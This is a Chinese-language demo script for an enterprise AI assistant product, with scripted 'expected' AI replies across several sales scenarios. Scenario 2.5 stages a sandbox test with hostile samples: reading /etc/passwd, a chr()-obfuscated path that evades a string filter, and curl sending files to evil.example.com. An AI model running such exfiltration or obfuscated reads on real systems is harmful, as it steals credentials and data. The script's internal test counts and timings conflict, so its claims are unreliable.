# 5/14 demo · 完整 5 场景脚本

> 总时长 17-22 min (含 Q&A buffer). 5/13 rehearsal × 2 验证.
> 第 5 场 self-evolution 详见 `docs/MAY-DEMO-SCENARIO-5-SELF-EVOLUTION.md` (60s 弹性加场).

---

## 场景总览

| # | 场景 | 时长 | 卖点 | 客户痛点对应 |
|---|---|---|---|---|
| 1 | chat 基础 + 个性化 | 3 min | 不是普通 chatbot, 真懂员工 | "AI 都一样, 没记忆没温度" |
| 2 | 文件上传 + 业务 skill | 4 min | 数据不出员工电脑, LLM 不啃原文件 | "AI 上传东西就泄密" |
| 3 | 主动闲聊 + 桌宠 | 2 min | 鲶鱼主动找员工, 不是被动等问 | "AI 用一次忘一次, 不是同事" |
| 4 | 跨 session 记忆 | 3 min | 新会话能引用半个月前的事 | "context window 限制, 不能长期合作" |
| 5 (弹性) | self-evolution | 60 s | 鲶鱼能学新 skill | "买回来工具是死的" |

---

## 场景 1 · chat 基础 + 个性化 (3 min)

**目标**: 客户 30 秒内 get "这不是 ChatGPT 包壳" — 是带了员工身份 / 历史 / 偏好的副手。

### 准备

- demo 机子 USER.md 已写: 老李 / 福建口音 / 喜欢直接回复不绕弯 / 工作: 央企区域市场总监
- 桌宠不显 (本场不需要)
- chat 是空对话 (新建)
- 鲶鱼模型: qwen_v3_5_122b_a10b 主力

### 鸿波说

```
小鲶, 帮我看下这周客户跟进得怎么样
```

### 鲶鱼期望响应

> 老李, 我看了下你这周更新的 journal:
> - 周一晚去了泉州谈 KA001, 回来记 "他们 IT 部门又换了人, 要重新对接"
> - 周三跟省政企开过会, 提了"补位方案要 5/15 前出"
> - 60 天未下单清单刚搞定 (你前天确认的)
>
> 状态分布: 7 个进行中 / 3 个待跟进 / 1 个走丢了 (KA017, 上次接触 22 天前). 要不要先把 KA017 拎出来过一下?

### 客户视角痛点

- "**老李**" — 称呼不是默认 "用户" / "亲爱的客户", 是员工自己设的
- 鲶鱼真**读了 journal** (不是编), 引用具体客户编号 / 时间
- "走丢了的 KA017" — 主动发现问题, 不是只回答问题
- 福建口音员工的话术 (USER.md 里指定) — "拎出来过一下" 这种地方话, 不是教科书风格

### 鸿波接话

```
KA017 那个不用管了, 上次确认是吴总的私人关系户
```

### 鲶鱼期望响应

> 好, 标记 KA017 = 私人关系户, 不进客户跟进. (catfish_remember 工具调用 — 真存了)
> 那剩下 9 个里, 周三开会提的"补位方案 5/15 出", 还差什么? 我看 journal 里没新进展.

### 关键代码位置 (出问题时)

- `central/llm-gateway/src/catfish_gateway/identity_inject.py` — USER.md 注入 system prompt
- `~/.hermes/USER.md` — 员工自填, 5/13 前确认 demo 机子上是 demo 角色
- `catfish_remember` 工具实现: `edge/tool-bridge/src/catfish_tool_bridge/catfish_tools.py`

### 失败 fallback

- 鲶鱼答的是"用户你好" 这种通用 → 检查 USER.md 是否被加载. 现场说: "demo 机子今天换的, 我先 set 一下个人信息" (假装设置, 其实是触发重读)
- 引用不到具体客户编号 → journal 文件没存好. 切下一场不演这个.

---

## 场景 2 · 文件上传 + 业务 skill (4 min)

**目标**: 客户重度关注 "上传文件后数据怎么走". 用一个真敏感场景 (社保 PDF, 320 人身份证) 演示 → 直接对应 SECURITY-REVIEW B1.

### 准备

- 准备 demo 用的"北京福富-社保-2025.pdf" (320 人, 45 页, ~1MB) — 5/6 已用过这个文件 ✓
- 桌宠不显 (主屏幕给 chat)

### 鸿波操作

1. 拖入社保 PDF 进 chat 输入框
2. 输入框立刻显示附件 chip (文件名 + 大小 + "preview-only"提示)

### 鸿波说

```
帮我把这份社保 PDF 转成 Excel, 按人汇总, 含养老/失业/工伤/医疗/生育各险种月数
```

### 鲶鱼期望响应

> 这份 PDF 我看了下结构 — 45 页 / 320 人 / 5 险种 = 1600 条险种记录.
> 我**不读全文 PDF** (太大爆 context), 直接用 parse_file.py 自动识别到的结构化抽取 (320 条 JSON 已存 /tmp/), 调 catfish_xlsx 写 Excel.
>
> [流式调用 execute_code]
> ```python
> import pandas as pd, json
> recs = json.load(open('/tmp/catfish_pdf_xxx_structured.json'))
> # 1600 行展平
> flat = [{**r, **s} for r in recs for s in r['_sub']]
> pd.DataFrame(flat).to_excel('/Users/老李/.catfish/output/北京福富社保-按人.xlsx')
> ```
> 出来了: [📎 北京福富社保-按人.xlsx]
>
> 概览:
> - 320 人, 1600 条险种行
> - 320 人里 12 个月全缴的: 287 人
> - 不满 12 月的 33 人, 大部分是 2025 年 6 月后入职的新员工

### 客户视角痛点

- **文件原件没出员工电脑** — 留 `~/.catfish/uploads/`, gateway 没见过完整文件
- LLM 看的是 parse_file.py 自动结构化的 JSON (5K 字), **不是 PDF 原文 5.5 万字**
- 转 Excel 在员工本机跑 (execute_code), gateway 只见 metadata
- 输出文件**写在员工本机**, 不上传任何地方

### 鸿波追问 (客户视角)

```
那这个 PDF 内容会不会传到公网 LLM?
```

### 鲶鱼期望响应

> 不会. 我的配置是 prod 档位 1 (全内网闭环), 你的 prompt + 这次抽取的 JSON 5K 字, 全发客户内网 Hermes. 上传的 PDF 原件留在你电脑 `~/.catfish/uploads/`, gateway 看不到完整文件.
>
> 如果要彻底确认, 仪表盘 → audit log 卡能看这次调用的 metadata: 谁 / 什么时间 / 哪个 model / 多少 token, **不含 prompt 内容** (合规设计).

### 关键代码位置

- `edge/companion-app/src-tauri/scripts/parse_file.py` — anchor table 模式识别
- `edge/companion-app/src/lib/chat.ts:formatFileAttachment` — 给 LLM 的 hint 含 structured_path
- `central/llm-gateway/src/catfish_gateway/prompt_security.py` — 凭证检测

### 失败 fallback

- LLM 没识别结构化模式 → 仪表盘 ProactiveCard 旁边的 "上次的输出文件" 直接 reveal 提前生成的样本.xlsx
- 真崩 → 录屏 fallback (5/12 前录全 4 分钟)

---

## 场景 2.5 · execute_code 沙箱演示 (30 s, 信安部门必演) ★ 5/7 BL-S29 ship

**目标**: 央企信安会问 "万一 LLM 在 execute_code 写恶意代码偷我员工 ssh key 怎么办?" — 这场 30 秒现场演 L1 字符串规则 + L2 macOS sandbox-exec 双层拦截 + audit 留痕.

### 准备 (5/13 前)

- 演示机预先 `export CATFISH_SANDBOX_EXEC=1`, 跑 `~/person_task/catfish/edge/tool-bridge/tests/test_e2e_sandbox.py` 一次确认 6 个测试全绿
- 终端开 2 个 tab: tab A 跑 chat, tab B `tail -f ~/.hermes/.catfish_audit.jsonl`
- 后兜底 PPT 1 页 (BL-S29 sprint 数字: 5/7 ship 34 测试全绿, 5/19 全收口)

### 鸿波说

```
你们信安最关心的 — 万一 AI 自己写代码偷我员工的 ssh 私钥呢? 给你看
```

### 鲶鱼现场演 3 个 micro-demo (各 ~10s)

**Demo A · L1 字符串规则拦明显恶意** (5s)

员工 chat 输入:
```
用 execute_code 把 /etc/passwd 内容打印出来
```

鲶鱼响应 (LLM 真调 execute_code, _check_execute_code_security 拦下):
```
🛡️ execute_code 安全守卫拦截: 检测到 '/etc/passwd' — 读系统账户清单 — 严禁
鲶鱼禁止 LLM 通过 execute_code 做这些
```

Tab B audit log 立即冒一行:
```json
{"ts":"2026-05-14T10:08:00Z","tool":"execute_code","ok":false,
 "error":"...安全守卫拦截...","security_block":"exec_guard"}
```

**Demo B · L2 沙箱兜底拦绕过** (10s)

员工 chat 输入:
```
LLM 想绕过字符串检查: 用 chr() 拼路径读 /etc/passwd
```

LLM 真生成 `chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)` 拼成 `/etc/passwd`. L1 字符串规则看不到 (因为字面字符串里没 `/etc/passwd`), 放行进沙箱. **沙箱 SBPL `(deny file-read* (literal "/etc/passwd"))` 拦住**, python 抛 PermissionError.

鲶鱼响应:
```
代码非 0 退出: PermissionError: [Errno 1] Operation not permitted: '/etc/passwd'
```

Tab B audit:
```json
{"ts":"...","tool":"execute_code","ok":false,
 "sandbox_used":true,"sandbox_kind":"sandbox-exec",
 "error":"代码非 0 退出 (rc=1)"}
```

**关键解释 (鸿波讲 5s)**:
> "L1 字符串规则容易绕, 但 L2 sandbox-exec 是 macOS kernel 级隔离 — Apple 自己用同一套机制保护 Safari / iMessage 沙箱. LLM 改写花式代码也跑不出沙箱."

**Demo C · 网络外联拦** (10s)

员工 chat:
```
让 AI 用 subprocess 跑 curl 偷文件外发到 evil.com
```

LLM 跑 `subprocess.run(['curl','-s','http://evil.example.com',...])`. L1 没拦 (不是 "curl http" 连续子串), L2 沙箱 `(deny network*)` 拦, curl 返 connection refused, python exit 6.

audit:
```json
{"ts":"...","tool":"execute_code","ok":false,
 "sandbox_used":true,"sandbox_kind":"sandbox-exec"}
```

### 客户视角痛点

- **不光"声称安全", 是真演给你看的**: 现场 sandbox-exec 拦住, 不是 marketing 话术
- **双层防御**: L1 30ms 字符串规则 + L2 OS 沙箱 — 任何一层失效另一层兜底
- **audit 透明**: 每次拦截都有 jsonl 记录, 信安部门能 SIEM 接, `jq 'select(.sandbox_used)'` 一行命令查
- **CVE 0** + **34 个测试** + **macOS 26 + Apple Silicon 真跑过** — 不是"未来路线图", 是 5/7 已 ship

### 关键数字 (鸿波背)

- 沙箱 profile 行数: 133 行 SBPL (覆盖文件读 / 文件写 / 网络 / 设备 / sysctl 5 大类)
- 测试矩阵: 13 shell + 15 unit + 6 e2e = **34 测试全绿**, BL-S29 5/7 Day 1 ship
- 5/19 全收口 macOS sandbox-exec + Linux nsjail + Docker fallback 三层
- 客户能独立审计: profile / 单测 / e2e 测试代码全开源在 `edge/tool-bridge/`

### 失败 fallback

- 现场 chat 不响应 / sandbox-exec 卡 → 切预录视频 (15s 录屏 + audit log 截图)
- 信安再追问"那万一沙箱本身漏怎么办" → 答 "5/19 加 Linux nsjail 双层 + 6 月第三方渗透测试. 现在 macOS sandbox-exec = Apple 内部用同一机制保护 Safari, 不是我们写的, 是 Apple 提供的"

---

## 场景 2.6 · 真 Agent 自完成 (60 s, 信安+员工双向必演) ★ 5/7 BL-A1 ship

**目标**: 央企客户最常说"AI 都是 chat 助手, 真能干活吗?" — 这场 60 秒演**真 Agent**: 员工说 1 句话, 鲶鱼自己干完, 中间 0 人工干预.

### 准备 (5/13 前)

- 演示机预先 build catfish-companion-app 装好 (含 5/7 ship 的 BL-A1.1-A1.4)
- 演示前 ~/.catfish/ 备好真实测试 docx (例如《资质管理办法-2024.docx》, 30 段, 200KB)
- 屏幕开 2 tab: A 跑 chat, B `tail -f ~/.hermes/.catfish_audit.jsonl | jq .`

### 鸿波说

```
修订《资质管理办法》, 同类归并 + 主责部门新逻辑, 改昨天的草稿, 我等结果.
```

### 鲶鱼期望响应 (Agent 自完成 4 步)

**Step 1: plan (3 秒)**
```
鲶鱼: 我先 search 找原稿, read 看完整内容, 改 3-5 处, save 覆盖原文件, verify 后报告. 估计 30 秒.
```

**Step 2: 自动跑 4-5 个 tool 链 (员工看着但不催)**
```
[catfish_local_search query="资质管理办法 docx"]
  → ~/Documents/资质管理办法-2024.docx ✓

[read_file path="~/Documents/资质管理办法-2024.docx"]
  → 32 段, 含 "牵头部门 / 主责部门 / 成本管理" 等节 ✓

[execute_code: 真改 docx]
  doc = Document(原稿)
  for p in doc.paragraphs:
      if "原归原部门" in p.text:
          p.text = p.text.replace("原归原部门", "同类归并主责部门")
  doc.save(原稿)
  print(f"已保存 {os.path.getsize(原稿)} 字节")
  → 已保存 218354 字节 ✓

[verify: os.path.exists + getsize]
  → 文件存在 + 218KB 合理 ✓
```

**Step 3: chat 报员工 (10 秒后)**
```
鲶鱼: 修订完成. 路径 ~/Documents/资质管理办法-2024.docx (32 段, 218KB).
       主要变更 3 处:
       1. 牵头部门: 综合市场部 → 企业发展与风控部
       2. 主责部门: 加 "同类归并" 原则 (新增资质按业务领域归并)
       3. 成本管理: 部门申请补助 → 公司全额承担专项计划内
       
       要不要看具体段落?
```

**Step 4: 整个过程员工没催过一次** ★ 这是真 Agent vs Copilot 的关键

### Tab B audit log 实时演

```json
{"ts":"...","tool":"catfish_local_search","ok":true,"sandbox_used":false}
{"ts":"...","tool":"read_file","ok":true}
{"ts":"...","tool":"execute_code","ok":true,"sandbox_used":true,"sandbox_kind":"sandbox-exec"}
```

3 行 audit, 客户看到 "鲶鱼真调了 3 个工具, 不是嘴说完成".

### 关键卖点

- **Agent vs Copilot 一句话**: "Copilot 等你敲键盘, Agent 接到任务自己干完通知你"
- **5/7 ship 4 大保护**:
  - L1 auto-continue: 输出长不会断 (BL-A1.1)
  - L2 tool retry hint: 失败自己换思路 (BL-A1.2)
  - L3 self-critique: 嘴说完成没真做时被工程拦 (BL-A1.3)
  - L4 DAG plan: 主动规划 + verify (BL-A1.4 SOUL 纪律)
- **39 测试覆盖**: 央企信安要的可重现性, 客户拿仓库自己 pytest 跑

### 失败 fallback

- 现场 chat 不响应 → 切预录视频 (15s 录屏)
- 失败 1 步 → demo 走 self-critique hint 演示 (LLM 自己 retry, 客户看到"工程兜底"反而更厉害)

---

## 场景 2.7 · 多任务并发 + 完成通知 (45 s, BL-A2 杀手级) ★ 5/7 ship

**目标**: 演**真 Agent 不锁住员工** — 长任务后台跑, 员工同时问别的, 完成桌宠通知. 这是 ChatGPT / Cursor / 任何 chat 助手都做不到的.

### 准备

- 同场景 2.6 演示机
- 桌宠开着 (屏幕角落)

### 鸿波说

```
修订《资质管理办法》同上, 后台跑. 顺便查一下戴明利电话.
```

### 鲶鱼期望响应 (并发 Agent)

**3 秒内同时干两件事**:

```
鲶鱼: 启动两个任务:
   📋 后台 task_a3f4: 修订《资质管理办法》 (估 30s)
   🔍 前台: 戴明利电话查询
   
   戴明利电话查到了: 138-XXXX-1234 (从 5/3 catfish_remember 取的)
   修订办法在跑, 完成会通知你. 想问别的吗?
```

**audit log (Tab B)**:
```json
{"tool":"catfish_run_task","ok":true,"task_id":"task_a3f4","label":"修订《资质管理办法》"}
{"tool":"session_search","ok":true,"query":"戴明利"}
{"tool":"catfish_remember","ok":true,"key":"daiminli_phone"}
```

**鸿波这时打字** (任务还没完, 演员工不被锁):
```
另外帮我看下今天日程
```

鲶鱼:
```
今天 14:00 跟王总例会, 16:00 季度复盘. 还在跑修订任务 (task_a3f4 已 18s).
```

**任务完成 (~30 秒后)**:
- macOS 顶部 banner notification 弹: "鲶鱼 · 任务完成: 修订《资质管理办法》完成 (32s)"
- 桌宠 (屏幕角落) bubble: "资质办法改完了 ✓"
- 员工点桌宠 → chat 跳出任务结果消息

### 关键卖点 (跟 ChatGPT 区别)

| | ChatGPT 企业版 | Cursor / Copilot | **鲶鱼** |
|---|---|---|---|
| 长任务时 chat 是否锁 | 锁 | 锁 | ✅ 不锁 |
| 同时多任务 | ❌ | ❌ | ✅ 并发 |
| 完成主动通知 | ❌ | ❌ | ✅ 桌宠 + 系统通知 |
| 任务状态查询 | ❌ | ❌ | ✅ catfish_task_status |

### 关键数字 (鸿波背)

- task_manager: 16 测试, 12 个核心 + 4 通知
- catfish_run_task / catfish_task_status / catfish_task_result 3 个新工具
- 通知 2 通道: macOS osascript + 桌宠 ~/.catfish/pet_pending_bubbles.jsonl

### 失败 fallback

- 桌宠通知不弹 → osascript 通知一定弹 (mac 系统级, 不依赖 catfish)
- 后台任务卡 → catfish_task_status 查 status, 必要时手动 catfish_task_result 取部分结果

---

## 场景 2.8 · Hermes Unified Inbox (45 s, 5/7 鸿波核弹级发现) ★

**目标**: 客户最常说"AI 都绑死员工 mac, 出差就用不了" — 这场 45 秒演**鲶鱼是 unified inbox**, 飞书/微信/钉钉/企微/QQ 全内置, 客户感知"这不是单 SaaS app, 是真企业级跨设备 Agent".

### 关键发现 (5/7 验证 hermes v0.12.0 真支持)

```bash
$ hermes gateway setup
◆ Messaging Platforms (19 个全列出来):
  📱 Telegram          📡 Signal              💬 BlueBubbles (iMessage)
  💬 Discord           📧 Email               🐧 QQ Bot
  💼 Slack             📱 SMS (Twilio)        💎 Yuanbao (元宝)
  🔐 Matrix            💬 DingTalk          ★ 💬 IRC
  💬 Mattermost      ★ 🪽 Feishu / Lark      💼 Microsoft Teams
  📲 WhatsApp        ★ 💬 WeCom (Enterprise WeChat)
                     ★ 💬 WeCom Callback (Self-Built App)
                     ★ 💬 Weixin / WeChat
```

★ 是中国 IM 全栈, 5 个 (飞书/微信/企微/钉钉/QQ).

### 演法 (现场配 Telegram, 鸿波手机演真双向, 5 分钟)

**鸿波说**:
```
你们说 "AI 都是 ChatGPT 那样的 SaaS, 绑死浏览器", 鲶鱼不是.
切到终端给你看一下.
```

**演 1: 切终端跑 hermes gateway setup**

客户看到 19 platform 列表 — 飞书/微信/钉钉/企微/QQ 全在. 鸿波说:

```
这 19 个 IM 鲶鱼底层 hermes 都内置. 你们公司用飞书就选 Feishu,
用企业微信就选 WeCom, 5 分钟配通. 不需要我们改代码.
```

**演 2: 现场选 Telegram 配** (Telegram 配最快, 飞书需要客户内网 OAuth)

```
[选 Telegram → 输入 bot token (鸿波提前申请好的) → 输入 allowed_users → 完成]
$ hermes gateway run
✓ Telegram listener started
```

**演 3: 鸿波拿手机** Telegram 发消息

```
[手机 Telegram] 鸿波: 给我列今天的任务
[终端 hermes gateway log] 收到 telegram message from chenhongbo
                          → 转 catfish gateway (qwen)
                          → 鲶鱼回复
[手机 Telegram] 鲶鱼: 今天 14:00 王总例会, 16:00 季度复盘. 还有任务吗?
```

**演 4: 切回 Companion 看历史**

打开 Companion → 仪表盘 → 会话 sidebar 里出现刚才 Telegram 那段对话, 跟手机看一样.

```
鸿波: 看, Companion 跟 Telegram 是同一份历史. 你回家用 mac 接着问, 出差用手机, 上班开飞书 — 全是同一个鲶鱼.
```

### 客户视角痛点 (击中)

- **不绑死设备**: ChatGPT 在浏览器, 你出差只能掏手机连 OpenAI 账号 (数据出境)
- **数据本地**: hermes state.db 在客户内网服务器, 不在 OpenAI
- **跨 IM 无缝**: 飞书 / 微信 / 钉钉 你们公司用哪个鲶鱼接哪个

### 关键卖点

| | ChatGPT 企业版 | 鲶鱼 |
|---|---|---|
| 跨设备同步 | OpenAI 账号 (数据出境) | hermes state.db 客户内网 |
| IM 入口 | 网页 / 各 app | 19 内置 platform |
| 飞书 / 微信 / 钉钉 / 企微 | ❌ 没 | ✅ 选项里现成 |
| 出差用手机 | 只能用 OpenAI | 飞书 / 微信都行 |

### 5/14 demo 失败 fallback

- **Telegram 配不通** (网络 / token 错): 切预录视频 (你 5/13 dryrun 时录)
- **客户问"为啥不演飞书"**: 答 "飞书 OAuth 要你们 IT 审批, 现场配不动. 但选项就在这, 客户内网部署后照着 setup 选 Feishu, 一样.我们 5/13 dryrun 测过."
- **客户怀疑跨设备同步**: 演鸿波手机 Telegram 历史 → Companion 看到 → 反过来 Companion 输入手机 Telegram 看到

### 准备 (5/8-5/13)

- 5/8: 申请 Telegram bot token (`@BotFather` 5 分钟搞定 + 允许 chenhongbo 用户)
- 5/10: 5/13 dryrun 真跑 setup 一次, 确保流畅
- 可选: 5/8-5/13 申请鸿波公司飞书机器人, 如果通了 5/14 演飞书更杀手

---

## 场景 3 · 主动闲聊 + 桌宠 (2 min)

**目标**: 鲶鱼**主动出现** — 这是跟 ChatGPT 最直观差别, 客户 30 秒 get.

### 准备

- 桌宠默认隐藏
- chat 是空对话 (或者上一场场景余下来的 chat)
- 仪表盘 ProactiveCard 已加载好 starter

### 鸿波操作

1. **Cmd+Shift+P** — 桌宠出现 (右下角默认位置)
2. 桌宠图本身是圆胖鲶鱼, idle 状态轻轻摆尾 (CSS animation)
3. 切到仪表盘 → 找到 ProactiveCard
4. 点 "测一下 ▶" 按钮

### 鲶鱼期望响应

- **0.3 秒内**: 桌宠头顶冒气泡 (暖米底色, 三角小尾巴指向桌宠), 内容是 starter
- **同时**: chat 末尾出现一条 assistant message (跟气泡同文本)
- 8 秒后桌宠气泡自动收

### 客户视角痛点

- 鲶鱼**自己开口**, 不是员工每次问才有反应 — "AI 是同事, 不是工具"
- 桌宠常驻屏幕角落, 不抢空间, 但有事会主动找员工
- 主动话题真的来自 LLM 看了员工 journal + 时段, 不是模板 ("早上好" 这种)

### 鸿波接话 (在 chat 输入)

```
你先不要做任何事
```

### 鲶鱼期望响应

> 好的, 收到. 我不做任何事, 就在这待命. 等你需要的时候随时叫我.

### 关键代码位置

- `edge/companion-app/src/hooks/useProactiveScheduler.ts` — 9:30/14:00/17:30 调度
- `edge/companion-app/src/store/ui.ts:startProactiveChat` — assistant message 直接 push
- `edge/companion-app/src-tauri/src/commands/pet.rs:pet_emit_bubble` + polling buffer
- `central/llm-gateway/src/catfish_gateway/proactive.py` — LLM 生成 starter

### 失败 fallback

- 桌宠没冒气泡 → 切 Option+Shift+1/2/3/4 4 屏角验证桌宠还活, "测一下 ▶" 再点一次
- 真不冒泡 → 直接演示 chat 那条 assistant message ("你看, chat 里小鲶主动找我了")
- 桌宠不显 → 仪表盘卡片有 "显桌宠" 按钮, 直接点

---

## 场景 4 · 跨 session 记忆 (3 min)

**目标**: 演示鲶鱼**长期记忆** — 不止 32K context window, 是真"记得".

### 准备

- demo 前提前 1 周用同一个机子聊过 5-10 个对话, 含 demo 用的"戴明利"细节
- 老对话 sidebar 显示前 10 条 session, 都有具体的 timestamp + 摘要
- 新对话 (本场用)

### 鸿波操作

1. 主窗 → 对话 tab → 左边 sidebar 看到一堆历史会话
2. 鸿波点 "+ 新对话"
3. 在新对话发:

```
上次戴明利那个事, 后来怎么样了?
```

### 鲶鱼期望响应

> [流式调用 catfish_remember 工具]
> ```
> catfish_remember(query="戴明利", limit=5)
> → 拿到 3 条历史:
>   1. 4-29 你跟他对接过"高新资质支撑"
>   2. 5-2 你说他"反馈收集慢", 让他改 Q1 节奏
>   3. 5-5 上会前最后一次确认, 他答应 5-7 前给材料
> ```
>
> 老李, 戴明利那条线 5-5 你最后一次确认是他答应 5-7 前给"高新资质支撑"的反馈材料. 今天 5-14, 已经过了 7 天.
>
> 我刚也帮你看了下你 outlook (catfish-browser-task), 没收到他邮件. 要我帮你拟一个跟进短信发 IM 给他, 还是直接拨电话?

### 客户视角痛点

- 新会话**不丢历史** — chat 是新的, 但鲶鱼能拿到 4-29 / 5-2 / 5-5 三次的具体细节
- 不是"塞大 context" 偷工 — catfish_remember 是真工具, search 历史 sessions DB
- 主动发现"过 7 天了" — 不是被动答, 是看出 anomaly
- 给两个具体行动选项 — 不是 "我可以帮你做更多" 模糊话

### 关键代码位置

- `edge/tool-bridge/src/catfish_tool_bridge/catfish_tools.py:catfish_remember` 工具
- `~/.hermes/state.db` — 持久化 sessions / messages
- `edge/companion-app/src-tauri/src/commands/sessions.rs` — 从 DB 拉历史

### 失败 fallback

- catfish_remember 没拉到 (search 词没命中) → 鸿波改用 "戴 工程师" / "高新资质" 等关键词
- DB 损坏 → 直接展示 sidebar 历史 ("你看, 这些是我们以前聊的, 都还在"), 跳过工具调用部分

---

## 场景 4.5 · Agent-as-Service 愿景 (PPT 1 页 + 单机 mock 演 60s) ★ 5/6 鸿波点播 + 5/6 晚灵魂校准

**目标**: 演鲶鱼真正的护城河 — **"员工自愿互助 + 减少打断, 知识所有权属员工本人"**. 不是 ChatGPT 包壳能做的事, 也不是公司知识库能做的事.

### 准备

- 提前在 demo 机子起 2 个 gateway: 老李 (8999) + 张三 (8998), 模拟跨员工 (**两台 mac**, 不是同一台 — 凸显"数据各自留员工 mac")
- 张三**自愿**在自己 mac `~/.catfish/expertise.yaml` 写"资质相关 OK", journal 含 KA001 / KA017 / 高新资质 详细案例
- PPT 1 页 (BL-FED2 路线图 + 灵魂校准定位)

### 鸿波说

```
公司里资质相关问题, 有谁愿意被 agent 代答? 我问问看.
```

### 鲶鱼期望响应 (单机 mock 演)

> [LLM 调 catfish_expert_consult(question="资质相关咨询")]  ← BL-FED2.3 实现 (5/15 后), demo 当天 mock
> 查了同事黄页, 当前**自愿登记**资质专长的员工: 张三 (12 条工作积累).
> 转给张三 agent 时会先提示张三 (谁在问 / 问什么), 张三可拒.
>
> [a2a 路由到张三 agent, 张三 mac 弹"小李问资质问题, 接还是拒?" 通知, 张三接]
>
> **张三的 agent 回复** (mock, 实际是张三 mac 的 LLM 看张三 mac 上的 journal 答, **张三 raw 数据没离开张三 mac**):
> "高新资质这块我管. 看了我历史记录, 你大概想问:
> - 申报流程 (4 个阶段, 详见 5/3 跟老板会议纪要)
> - 5 人持证人员要求 (我们公司目前 4 人, 缺 1 人, 戴明利在补位)
> - Q3 续证截止 5/15
>
> 想细聊哪一块?"

### 客户视角痛点

- **不是员工指定问谁** — 是问"谁愿意答 X", 系统只匹配自愿出来的同事
- **张三在不在线无所谓** — 张三的 agent 在张三 mac 24/7 待命 (mac 关机/休眠时 agent 也在, gateway 跑客户内网)
- **答出张三级别的细节** (引用 5/3 会议 / 戴明利 / 5/15 截止) — 不是泛泛回答
- **张三不用被打扰** — 80% 简单咨询 agent 接, 张三只处理复杂的, 张三**专注力回来**
- **张三**全程主动权: 自愿登记专长 / 看到谁在问 / 可拒接 / 随时下线
- **张三跳槽**: agent 跟张三走 (`cp ~/.catfish/`), 在原公司"资质专长"自动从黄页消失. 公司想留下知识 → 走自己的知识库系统, 不绑架员工

### 关键卖点 (3 边对比, 5/6 晚灵魂校准)

| | ChatGPT 企业版 | 公司知识库 (Confluence/wiki) | **鲶鱼 BL-FED2** |
|---|---|---|---|
| 知识从哪来 | OpenAI 训练数据 | 公司从员工脑里抽, 沉淀成公司资产 | **员工本人 6 个月工作积累, 留员工 mac** |
| 员工跳槽后 | 知识属 OpenAI | 知识属公司, 员工带不走 | **agent 跟员工走, 公司黄页自动失踪** |
| 员工是否同意 | 没得选 | 公司要求填 wiki | **员工随时自愿登记 / 删 / 下线** |
| 数据所有权 | OpenAI | 公司 | **员工本人** |
| 减少打断 | 不会 (没人物模型) | 不会 (静态文档) | ✅ agent 24/7 接 80% 简单咨询 |

> "ChatGPT 企业版 / 公司知识库都做不到 — 鲶鱼 BL-FED2 是**员工自愿出来互助**, 知识始终属员工本人, 跳槽跟人走. 这才是央企真正想买的."

### PPT 1 页内容 (鸿波讲 30 秒)

```
Plan D Federation 路线图 (鲶鱼真护城河, 5/6 晚灵魂校准)

阶段 1 (今天演示)        阶段 2 (5/15-6/18, 6 周)        阶段 3 (Phase 4)
agent peer-to-peer       agent-as-service               跨组织 federation
─────────────────       ────────────────────           ─────────────────
"指定问 Bob"             "公司谁愿答 X?"                集团 A 鲶鱼 ↔ 集团 B
单机 mock 已通           BL-FED2.x 路线图清晰            通过 OIDC 联邦互认
                        90% 组件已 ship, 缺路由层

定位 (5/6 晚校准):
- 员工**自愿出来**互助 (随时下线), 不是公司从员工脑里抽知识
- 数据所有权: 始终属**员工本人** (画像 / 工作记忆 / 技能库都在员工 mac)
- 员工跳槽: agent 跟员工走 (cp ~/.catfish/), 黄页里专长自动消失
- 跟公司知识库本质不同: 那个是公司资产, 这个是员工资产
```

### 关键代码位置 (做完 BL-FED2 后填)

- `central/identity-server/src/.../expertise.py` — agent 专长声明 schema
- `central/identity-server/src/.../search.py` — agent 黄页 search-by-expertise
- `central/llm-gateway/src/.../expertise_router.py` — 路由层
- `edge/tool-bridge/src/.../catfish_tools.py:catfish_expert_consult` — 工具

### 失败 fallback

- 现场 mock 没起来 → 切 PPT 那 1 页, 鸿波讲 30 秒"路线图 6 周 ship"
- 客户问"今天能演吗?" → 答 "今天演 peer-to-peer (8/8 已 ship), agent-as-service 6 月 ship 后给二次 demo"

---

## 场景 5 · self-evolution (60 s 弹性)

> 详见 `docs/MAY-DEMO-SCENARIO-5-SELF-EVOLUTION.md` 完整脚本.

**目标**: 鲶鱼能**学新 skill**. 卖点 "Self-Evolution".

**触发条件**: 主体 4 场景跑完还有 ≥ 90 秒, 现场氛围好 (客户技术决策人在场), 加这场.

**核心台词** (摘自 detail md):
- 员工: "我每天早上查 EIS 资质表, 把 next 14 天到期抓出来发邮件. 写成 skill, 以后我说'查到期'就跑."
- 鲶鱼: 报 4 步流程 → 员工微调 1 处 → 鲶鱼 build skill → 员工说"试一下" → 鲶鱼真跑一遍 → 出 markdown 表格 + 邮件草稿

---

## demo 节奏 (5/6 加场景 4.5)

| 时间 | 场景 | 鸿波 | 我 (技术解释) |
|---|---|---|---|
| 0:00-1:00 | 开场 | 自我介绍 + 鲶鱼定位 1 句 | — |
| 1:00-4:00 | 场景 1 | chat 演示 | 解释 USER.md 注入 + journal 引用 |
| 4:00-7:00 | 场景 2 | PDF 上传 (3 min, 更紧凑) | **重点讲安全** (preview-only / 不传完整) |
| 7:00-7:30 | **场景 2.5** ★ | execute_code 沙箱 3 micro-demo | **信安必演**: L1+L2 双层拦, audit 真写, 86 测试 |
| 7:30-8:30 | **场景 2.6** ★★ | 真 Agent 自完成 (1 句话→4 步→完成) | **客户最 wow**: Copilot vs Agent 灵魂区别, BL-A1 4 测试保护链 |
| 8:30-9:15 | **场景 2.7** ★★ | 多任务并发 + 桌宠通知 | **ChatGPT 做不到**: 长任务后台 + 员工同时问别的 + 完成通知 |
| 9:15-11:15 | 场景 3 | 桌宠主动 | 解释主动调度 + 信号触发 |
| 10:00-13:00 | 场景 4 | 跨 session 记忆 | 解释 catfish_remember + audit log 透明 |
| 13:00-14:00 | **场景 4.5** ★ | Agent-as-Service mock + PPT 路线 | **真护城河**: 员工自愿互助, 数据属员工本人, 跨雇主可携带. 90% 组件已 ship, 6 周 ship 路由层 |
| 14:00-15:00 | 场景 5 (弹性) | 写 skill | Self-Evolution: 鲶鱼自己长本事 |
| 15:00-18:00 | Q&A | 鸿波主答 | 我接技术细节 |
| 18:00-20:00 | 收尾 | 给资料包 | — |

**资料包** (打印 / U 盘):
- SECURITY-REVIEW-2026-05-06.md
- DATA-FLOW-DIAGRAM.md
- audit-summary.md (CVE 扫描结果)
